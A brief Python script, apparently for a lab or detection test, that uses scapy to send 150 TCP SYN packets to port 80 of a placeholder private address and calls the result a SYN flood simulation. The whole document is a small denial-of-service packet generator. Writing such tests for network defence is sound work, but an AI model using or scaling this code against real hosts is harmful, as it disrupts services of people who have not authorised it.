from scapy.all import *
import time

target_ip = "192.168.x.x"
for i in range(150):
    send(IP(dst=target_ip)/TCP(dport=80, flags="S"), verbose=0)
    time.sleep(0.01)  # Small delay
print("SYN flood simulation complete.")